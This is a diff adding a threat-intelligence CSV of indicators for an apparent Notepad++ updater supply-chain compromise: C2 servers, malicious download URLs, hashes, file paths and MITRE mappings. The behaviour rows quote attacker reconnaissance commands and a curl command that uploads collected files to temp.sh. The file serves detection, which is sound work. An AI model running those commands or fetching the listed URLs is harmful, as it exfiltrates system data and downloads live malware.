@@ -1,0 +1,134 @@
+ioc_type,ioc_value,chain,context,source,risk,mitre_technique
+ip,45.76.155.202,1/2,Malicious update distribution server (http://45.76.155.202/update/update.exe),Kaspersky,CRITICAL,T1195.002
+ip,45.32.144.255,3,Malicious update distribution server (http://45.32.144.255/update/update.exe),Kaspersky,CRITICAL,T1195.002
+ip,95.179.213.0,2,Malicious update distribution server (October 2025),Kaspersky/CrowdStrike,CRITICAL,T1195.002
+ip,45.77.31.210,1,Cobalt Strike Beacon C2 and Metasploit downloader,Kaspersky,CRITICAL,T1071.001
+ip,59.110.7.32,n/a,Cobalt Strike Beacon C2 (port 8880) - from multiscanner,Rapid7/CrowdStrike,HIGH,T1071.001
+ip,124.222.137.114,n/a,Cobalt Strike Beacon C2 (port 9999) - from multiscanner,Rapid7/CrowdStrike,HIGH,T1071.001
+ip,61.4.102.97,n/a,C2 server,CrowdStrike,HIGH,T1071.001
+ip,51.91.79.17,1/2,temp.sh IP - exfiltration of reconnaissance data,Kaspersky,HIGH,T1567
+domain,cdncheck.it.com,1/2,Cobalt Strike Beacon C2 (/api/update/v1 and /api/FileUpload/submit and /users/admin),Kaspersky,CRITICAL,T1071.001
+domain,safe-dns.it.com,2,Cobalt Strike Beacon C2 (/resolve and /dns-query) and Metasploit downloader (/help/Get-Start),Kaspersky,CRITICAL,T1071.001
+domain,self-dns.it.com,2,System information upload endpoint (/list),Kaspersky,CRITICAL,T1041
+domain,api.skycloudcenter.com,3,Chrysalis backdoor C2,Rapid7/Kaspersky,CRITICAL,T1071.001
+domain,api.wiresguard.com,3,Cobalt Strike Beacon C2 (typosquatting WireGuard),Rapid7/Kaspersky,CRITICAL,T1071.001
+domain,temp.sh,1/2,Exfiltration of reconnaissance data via curl upload,Kaspersky,HIGH,T1567
+url,http://45.76.155.202/update/update.exe,1/2,Malicious update download URL,Kaspersky,CRITICAL,T1195.002
+url,http://45.32.144.255/update/update.exe,3,Malicious update download URL,Kaspersky,CRITICAL,T1195.002
+url,http://95.179.213.0/update/update.exe,2,Malicious update download URL,Kaspersky,CRITICAL,T1195.002
+url,http://95.179.213.0/update/install.exe,2/3,Malicious update download URL (late October),Kaspersky,CRITICAL,T1195.002
+url,http://95.179.213.0/update/AutoUpdater.exe,2/3,Malicious update download URL (late October),Kaspersky,CRITICAL,T1195.002
+url,http://45.76.155.202/list,1/2,System information upload endpoint,Kaspersky,HIGH,T1041
+url,https://self-dns.it.com/list,2,System information upload endpoint,Kaspersky,HIGH,T1041
+url,https://45.77.31.210/users/admin,1,Metasploit downloader URL for CS Beacon,Kaspersky,CRITICAL,T1105
+url,https://cdncheck.it.com/users/admin,1/2,Metasploit downloader URL for CS Beacon,Kaspersky,CRITICAL,T1105
+url,https://safe-dns.it.com/help/Get-Start,2,Metasploit downloader URL for CS Beacon,Kaspersky,CRITICAL,T1105
+url,https://45.77.31.210/api/update/v1,1,Cobalt Strike Beacon GET URL,Kaspersky,CRITICAL,T1071.001
+url,https://45.77.31.210/api/FileUpload/submit,1,Cobalt Strike Beacon POST URL,Kaspersky,CRITICAL,T1071.001
+url,https://cdncheck.it.com/api/update/v1,1,Cobalt Strike Beacon GET URL,Kaspersky,CRITICAL,T1071.001
+url,https://cdncheck.it.com/api/Metadata/submit,1,Cobalt Strike Beacon POST URL,Kaspersky,CRITICAL,T1071.001
+url,https://cdncheck.it.com/api/getInfo/v1,2,Cobalt Strike Beacon GET URL,Kaspersky,CRITICAL,T1071.001
+url,https://cdncheck.it.com/api/FileUpload/submit,2,Cobalt Strike Beacon POST URL,Kaspersky,CRITICAL,T1071.001
+url,https://safe-dns.it.com/resolve,2,Cobalt Strike Beacon GET URL,Kaspersky,CRITICAL,T1071.001
+url,https://safe-dns.it.com/dns-query,2,Cobalt Strike Beacon POST URL,Kaspersky,CRITICAL,T1071.001
+url,https://api.skycloudcenter.com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821,3,Chrysalis backdoor C2 URL,Rapid7,CRITICAL,T1071.001
+url,https://api.wiresguard.com/update/v1,3,Cobalt Strike Beacon GET URL,Rapid7,CRITICAL,T1071.001
+url,https://api.wiresguard.com/api/FileUpload/submit,3,Cobalt Strike Beacon POST URL,Rapid7,CRITICAL,T1071.001
+url,https://api.wiresguard.com/users/system,3,Cobalt Strike Beacon URL (from multiscanner),Rapid7,CRITICAL,T1105
+url,https://api.wiresguard.com/api/getInfo/v1,3,Cobalt Strike Beacon URL (from multiscanner),Rapid7,CRITICAL,T1071.001
+url,http://59.110.7.32:8880/uffhxpSy,n/a,Cobalt Strike Beacon URL (from multiscanner),Rapid7,HIGH,T1105
+url,http://59.110.7.32:8880/api/getBasicInfo/v1,n/a,Cobalt Strike Beacon GET URL (from multiscanner),Rapid7,HIGH,T1071.001
+url,http://59.110.7.32:8880/api/Metadata/submit,n/a,Cobalt Strike Beacon POST URL (from multiscanner),Rapid7,HIGH,T1071.001
+url,http://124.222.137.114:9999/3yZR31VK,n/a,Cobalt Strike Beacon URL (from multiscanner),Rapid7,HIGH,T1105
+url,http://124.222.137.114:9999/api/updateStatus/v1,n/a,Cobalt Strike Beacon GET URL (from multiscanner),Rapid7,HIGH,T1071.001
+url,http://124.222.137.114:9999/api/Info/submit,n/a,Cobalt Strike Beacon POST URL (from multiscanner),Rapid7,HIGH,T1071.001
+sha1,8e6e505438c21f3d281e1cc257abdbf7223b7f5a,1,Malicious update.exe (NSIS installer ~1MB) - late July 2025,Kaspersky,CRITICAL,T1195.002
+sha1,90e677d7ff5844407b9c073e3b7e896e078e11cd,1,Malicious update.exe - early August 2025,Kaspersky,CRITICAL,T1195.002
+sha1,573549869e84544e3ef253bdba79851dcde4963a,2,Malicious update.exe (NSIS installer ~140KB) - mid September 2025,Kaspersky,CRITICAL,T1195.002
+sha1,13179c8f19fbf3d8473c49983a199e6cb4f318f0,2,Malicious update.exe - late September 2025,Kaspersky,CRITICAL,T1195.002
+sha1,4c9aac447bf732acc97992290aa7a187b967ee2c,2,Malicious update.exe - late September 2025 (new C2 domains),Kaspersky,CRITICAL,T1195.002
+sha1,821c0cafb2aab0f063ef7e313f64313fc81d46cd,2,Malicious update.exe - mid October 2025 (return of chain #2),Kaspersky,CRITICAL,T1195.002
+sha1,d7ffd7b588880cf61b603346a3557e7cce648c93,3,Malicious update.exe (NSIS installer) - October 2025 Chrysalis chain,Kaspersky/Rapid7,CRITICAL,T1195.002
+sha1,06a6a5a39193075734a32e0235bde0e979c27228,1,ProShow exploit payload file (load),Kaspersky,CRITICAL,T1203
+sha1,9c3ba38890ed984a25abb6a094b5dbf052f22fa7,1,ProShow exploit payload file (load) - variant,Kaspersky,CRITICAL,T1203
+sha1,ca4b6fe0c69472cd3d63b212eb805b7f65710d33,2,Compiled Lua script (alien.ini) - shellcode launcher,Kaspersky,CRITICAL,T1059.006
+sha1,0d0f315fd8cf408a483f8e2dd1e69422629ed9fd,2,Compiled Lua script (alien.ini) - variant,Kaspersky,CRITICAL,T1059.006
+sha1,2a476cfb85fbf012fdbe63a37642c11afa5cf020,2,Compiled Lua script (alien.ini) - variant,Kaspersky,CRITICAL,T1059.006
+sha1,f7910d943a013eede24ac89d6388c1b98f8b3717,3,Malicious DLL for sideloading (log.dll),Kaspersky/Rapid7,CRITICAL,T1574.002
+sha1,7e0790226ea461bcc9ecd4be3c315ace41e1c122,3,Encrypted shellcode (BluetoothService),Kaspersky/Rapid7,CRITICAL,T1027
+sha1,21a942273c14e4b9d3faa58e4de1fd4d5014a1ed,3,Legitimate BluetoothService.exe (used for sideloading),Rapid7,MEDIUM,T1574.002
+sha1,94dffa9de5b665dc51bc36e2693b8a3a0a4cc6b8,3,Malicious file - Rapid7 investigation,Rapid7,CRITICAL,T1195.002
+sha1,73d9d0139eaf89b7df34ceeb60e5f8c7cd2463bf,n/a,Malicious file - Rapid7 investigation,Rapid7,HIGH,T1195.002
+sha1,bd4915b3597942d88f319740a9b803cc51585c4a,n/a,Malicious file - Rapid7 investigation,Rapid7,HIGH,T1195.002
+sha1,c68d09dd50e357fd3de17a70b7724f8949441d77,n/a,Malicious file - Rapid7 investigation,Rapid7,HIGH,T1195.002
+sha1,813ace987a61af909c053607635489ee984534f4,n/a,Malicious file - Rapid7 investigation,Rapid7,HIGH,T1195.002
+sha1,9fbf2195dee991b1e5a727fd51391dcc2d7a4b16,n/a,Malicious file - Rapid7 investigation,Rapid7,HIGH,T1195.002
+sha1,07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51,n/a,Malicious file - Rapid7 investigation,Rapid7,HIGH,T1195.002
+sha1,3090ecf034337857f786084fb14e63354e271c5d,n/a,Malicious file - Rapid7 investigation,Rapid7,HIGH,T1195.002
+sha1,d0662eadbe5ba92acbd3485d8187112543bcfbf5,n/a,Malicious file - Rapid7 investigation,Rapid7,HIGH,T1195.002
+sha1,9c0eff4deeb626730ad6a05c85eb138df48372ce,n/a,Malicious file - Rapid7 investigation,Rapid7,HIGH,T1195.002
+sha1,defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c,1,Legitimate ProShow.exe (abused for exploit),Kaspersky,LOW,T1203
+sha1,259cd3542dea998c57f67ffdd4543ab836e3d2a3,1,Legitimate ProShow file (defscr),Kaspersky,LOW,T1203
+sha1,46654a7ad6bc809b623c51938954de48e27a5618,1,Legitimate ProShow file (if.dnt),Kaspersky,LOW,T1203
+sha1,9df6ecc47b192260826c247bf8d40384aa6e6fd6,1,Legitimate ProShow file (proshow_e.bmp),Kaspersky,LOW,T1203
+sha1,6444dab57d93ce987c22da66b3706d5d7fc226da,2,Legitimate alien.dll (Lua foreign function interface),Kaspersky,LOW,T1059.006
+sha1,2ab0758dda4e71aee6f4c8e4c0265a796518f07d,2,Legitimate lua5.1.dll,Kaspersky,LOW,T1059.006
+sha1,bf996a709835c0c16cce1015e6d44fc95e08a38a,2,Legitimate script.exe (Lua interpreter),Kaspersky,LOW,T1059.006
+sha256,a511be5164dc1122fb5a7daa3eef9467e43d8458425b15a640235796006590c9,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,8ea8b83645fba6e23d48075a0d3fc73ad2ba515b4536710cda4f1f232718f53e,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,2da00de67720f5f13b17e9d985fe70f10f153da60c9ab1086fe58f069a156924,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,77bfea78def679aa1117f569a35e8fd1542df21f7e00e27f192c907e61d63a2e,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,3bdc4c0637591533f1d4198a72a33426c01f69bd2e15ceee547866f65e26b7ad,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,9276594e73cda1c69b7d265b3f08dc8fa84bf2d6599086b9acc0bb3745146600,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,f4d829739f2d6ba7e3ede83dad428a0ced1a703ec582fc73a4eee3df3704629a,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,4a52570eeaf9d27722377865df312e295a7a23c3b6eb991944c2ecd707cc9906,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,831e1ea13a1bd405f5bda2b9d8f2265f7b1db6c668dd2165ccc8a9c4c15ea7dd,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,0a9b8df968df41920b6ff07785cbfebe8bda29e6b512c94a3b2a83d10014d2fd,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,4c2ea8193f4a5db63b897a2d3ce127cc5d89687f380b97a1d91e0c8db542e4f8,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,e7cd605568c38bd6e0aba31045e1633205d0598c607a855e2e1bca4cca1c6eda,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,078a9e5c6c787e5532a7e728720cbafee9021bfec4a30e3c2be110748d7c43c5,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,b4169a831292e245ebdffedd5820584d73b129411546e7d3eccf4663d5fc5be3,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,7add554a98d3a99b319f2127688356c1283ed073a084805f14e33b4f6a6126fd,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+sha256,fcc2765305bcd213b7558025b2039df2265c3e0b6401e4833123c461df2de51a,n/a,Malicious binary - from CrowdStrike hunting queries,CrowdStrike,CRITICAL,T1195.002
+filepath,%appdata%\ProShow\,1,Working directory for chain #1 (ProShow exploit),Kaspersky,HIGH,T1036
+filepath,%appdata%\ProShow\load,1,ProShow exploit payload file,Kaspersky,CRITICAL,T1203
+filepath,%appdata%\Adobe\Scripts\,2,Working directory for chain #2 (Lua interpreter),Kaspersky,HIGH,T1036
+filepath,%appdata%\Adobe\Scripts\alien.ini,2,Compiled malicious Lua script,Kaspersky,CRITICAL,T1059.006
+filepath,%appdata%\Bluetooth\,3,Working directory for chain #3 (Chrysalis backdoor),Kaspersky/Rapid7,HIGH,T1036
+filepath,%appdata%\Bluetooth\BluetoothService,3,Encrypted shellcode for Chrysalis backdoor,Kaspersky/Rapid7,CRITICAL,T1027
+filepath,%appdata%\Bluetooth\log.dll,3,Malicious DLL for sideloading,Kaspersky/Rapid7,CRITICAL,T1574.002
+filepath,%localappdata%\Temp\ns.tmp\,all,NSIS installer runtime directory (present in all chains),Kaspersky,MEDIUM,T1195.002
+filepath,C:\ProgramData\USOShared\,3,Cobalt Strike Beacon drop location (observed by Rapid7 during IR),Rapid7,HIGH,T1074.001
+filename,update.exe,1/2/3,Malicious updater dropped by GUP.exe,Kaspersky,HIGH,T1036.005
+filename,install.exe,2/3,Malicious updater variant (late October),Kaspersky,HIGH,T1036.005
+filename,AutoUpdater.exe,2/3,Malicious updater variant (late October),Kaspersky,HIGH,T1036.005
+filename,BluetoothService.exe,3,Legitimate exe abused for DLL sideloading,Kaspersky/CrowdStrike,MEDIUM,T1574.002
+filename,log.dll,3,Malicious DLL sideloaded by BluetoothService.exe,Kaspersky/CrowdStrike,CRITICAL,T1574.002
+filename,libtcc.dll,n/a,Suspicious DLL (from CrowdStrike queries),CrowdStrike,MEDIUM,T1574.002
+filename,alien.ini,2,Compiled malicious Lua script,Kaspersky,CRITICAL,T1059.006
+filename,alien.dll,2,Legitimate Lua FFI library (part of chain #2),Kaspersky,LOW,T1059.006
+filename,script.exe,2,Legitimate Lua interpreter (abused in chain #2),Kaspersky,MEDIUM,T1059.006
+filename,ProShow.exe,1,Legitimate ProShow software (abused via old vulnerability),Kaspersky,MEDIUM,T1203
+filename,load,1,ProShow exploit payload,Kaspersky,CRITICAL,T1203
+filename,u.bat,n/a,Suspicious batch script (from CrowdStrike queries),CrowdStrike,MEDIUM,T1059.003
+filename,conf.c,n/a,Suspicious staging file (from CrowdStrike queries),CrowdStrike,MEDIUM,T1027
+filename,admin.exe,n/a,Suspicious filename (from CrowdStrike queries),CrowdStrike,MEDIUM,T1036.005
+filename,system.exe,n/a,Suspicious filename (from CrowdStrike queries),CrowdStrike,MEDIUM,T1036.005
+filename,loader1.exe,n/a,Suspicious filename (from CrowdStrike queries),CrowdStrike,MEDIUM,T1036.005
+filename,loader2.exe,n/a,Suspicious filename (from CrowdStrike queries),CrowdStrike,MEDIUM,T1036.005
+filename,s047t5g.exe,n/a,Suspicious filename - randomized (from CrowdStrike queries),CrowdStrike,MEDIUM,T1036.005
+filename,ConsoleApplication2.exe,n/a,Suspicious filename (from CrowdStrike queries),CrowdStrike,MEDIUM,T1036.005
+filename,3yzr31vk.exe,n/a,Suspicious filename - randomized (from CrowdStrike queries),CrowdStrike,MEDIUM,T1036.005
+filename,uffhxpSy.exe,n/a,Suspicious filename - randomized (from CrowdStrike queries),CrowdStrike,MEDIUM,T1036.005
+useragent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/138.0.0.0 Safari/537.36,1,User-Agent used by Metasploit downloader in chain #1,Kaspersky,LOW,T1071.001
+useragent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/140.0.0.0 Safari/537.36,2,User-Agent used in chain #2 (late September),Kaspersky,LOW,T1071.001
+behavior,gup.exe spawning unexpected child processes,all,Primary behavioral indicator - GUP.exe should only spawn legitimate Notepad++ installer,All sources,CRITICAL,T1195.002
+behavior,cmd /c whoami&&tasklist > 1.txt,1,Reconnaissance command chain #1 (early variant),Kaspersky,HIGH,T1082
+behavior,cmd /c whoami&&tasklist&&systeminfo&&netstat -ano > a.txt,2,Reconnaissance command chain #2 (expanded),Kaspersky,HIGH,T1082
+behavior,curl -F file=@*.txt -s https://temp.sh/upload,1/2,Exfiltration of recon data to temp.sh,Kaspersky,HIGH,T1567
+behavior,EnumWindowStationsW API used for shellcode execution,2,Lua script uses this API to launch shellcode,Kaspersky,HIGH,T1106
+behavior,Cobalt Strike Beacon config XOR key CRAZY,1/2/3,All observed CS Beacons use this XOR key for config encryption,Kaspersky,HIGH,T1573
+cve,CVE-2025-15556,all,Download of code without integrity check in WinGUp updater,Tenable,CRITICAL,T1195.002
+attribution,Lotus Blossom / Bilbug / Raspberry Typhoon / Thrip,all,Chinese state-sponsored APT group - primary attribution by Rapid7,Rapid7/Tenable,INFO,n/a
+attribution,Zirconium / Violet Typhoon,all,Alternative attribution by Kevin Beaumont,Kevin Beaumont,INFO,n/a
+compromise_window,2025-06-01 to 2025-12-02,all,Full compromise window - infrastructure access from June to December 2 2025,All sources,INFO,n/a
